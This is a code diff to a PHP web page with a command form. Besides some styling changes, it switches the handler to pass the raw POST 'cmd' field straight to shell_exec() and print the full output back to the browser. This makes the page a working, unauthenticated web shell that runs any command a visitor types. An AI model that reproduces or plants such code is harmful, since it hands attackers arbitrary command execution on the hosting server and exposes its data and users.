@@ -112,7 +112,21 @@ font-family:"Arial";
 .progress .prginfo {
         margin: 3px 0;
 }
-
+pre {
+            background: none repeat scroll 0 0 #333333;
+            overflow: auto;
+            border-radius: 8px 8px 8px 8px;
+            height: auto;
+            max-height: 500px;
+            color: white;
+            font-family: Monaco,Courier,MonoSpace;
+            font-size: 12px;
+            line-height: 1.8;
+            margin: 0 0 25px;
+            overflow: auto;
+            padding: 10px;
+            position: relative;
+        }
 </style>
 </center>
 <div class='progress'>
@@ -137,19 +151,19 @@ font-family:"Arial";
 </form>
 </fieldset>
 </center>
+<?php
+if(isset($_POST['SendCMD'])) {
+	$output = shell_exec("{$_POST['cmd']}");
+}
+?>
 
-
+<code><pre><?php echo $output; ?></pre></code>
 <center><form action="" method="post" enctype="multipart/formdata">
 	<p>	
 		<input type="text" name="cmd" placeholder="Enter Command" />
-		<input type="submit" name="SendCMD" value="Send CMD" />
+		<input type="submit" name="SendCMD" value="Send Command"/>
 	</p>
 </form></center>
-<?php
-if(isset($_POST['SendCMD'])) {
-	echo exec("{$_POST['cmd']}");
-}
-?>
 
 
 
